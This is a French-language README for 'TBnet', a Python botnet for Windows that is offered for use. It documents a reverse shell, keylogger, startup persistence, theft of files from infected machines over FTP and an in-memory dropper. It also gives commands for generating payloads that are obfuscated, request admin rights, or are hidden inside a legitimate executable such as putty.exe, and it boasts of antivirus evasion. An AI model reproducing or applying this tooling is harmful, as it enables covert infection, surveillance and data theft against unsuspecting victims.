# TBnet
BotNet en python en développement, acctuelement le programme coter client et serveur fonctionne uniquement sous Windows.

## Prérequis
Fonctionne avec Python 3.7 uniquement.
Afficher version python :
```cmd
python --version
```
ou :
```cmd
py --version
```
Installer les requirement :
```cmd
pip install -r requirements.txt
```

## Fonctionnalité

Serveur peut gérer plusieur clients en même temps.

Fonction Reverse Shell.

Fonction Keylogger.

Fonction Persistance.

Fonction Download de fichier via un serveur FTP.

Stocke les informations recupérer des fichiers .json

Utilisation d'un droppeur pour charger le payload directement dans la mémoire vive, via le réseau

Aucune dépendance requise sur la machine cible meme pas python lui meme

Payload ne déclanche à priori aucun antivirus (NE PAS UPLOAD SUR VIRUSTOTAL)

## Utilisation
Lancer d'abort le serveur :
```cmd
python server.py
```
Génerer un payload :
```cmd
  -h, --help            show this help message and exit
  --host HOST           Ip du Server
  --port PORT           Port du Server
  --name NAME           Définir nom du fichier
  --persistance PERSISTANCE
                        Active la persistance automatique
  --freeze              compile le client dans un executable
  --hide-in-exe PATH_EXE
                        Cache un payload dans un exe sain
  --obf                 obfusque le code python
  --icon ICON           Ajoute une icon à l'éxecutable
  --admin               Demande une autorisation Administrateur au lancement
                        du programme
```

Exemple de commande :
Genere un fichier .exe
```cmd
python client.py --host 127.0.0.1 --freeze --name test
```
Genere une copi du fichier sain putty.exe comportant un payload
```cmd
python client.py --host 127.0.0.1 --hide-in-exe putty.exe
```

__Disclaimer__: Le payload est "compiler" via Nuitka

### Commande du server

help --- Afficher le menu d'aide.

shell <"id du client"> --- Ouvre un Reverse Shell sur la machine.

clients --- Afficher les information des machines clients.

Dans le Shell :

keylogger <"run/status/stop"> --- Run lance un keylogger sur la machine, status renvoi les données enregistrer, stop arete le keylogger.

persistance <"startup/reg/powershell"> --- Startup active la persistance sur la machine via le dossier startup de windows, reg active la persistance via clé de registre windows(pas encore fait), powwershell active la persistance via powershell(pas encore fait).

download <"Fichier à télécharger"> --- Télécharge le fichier depuis la machine infecté via FTP dans le dossier ftp de TBnet
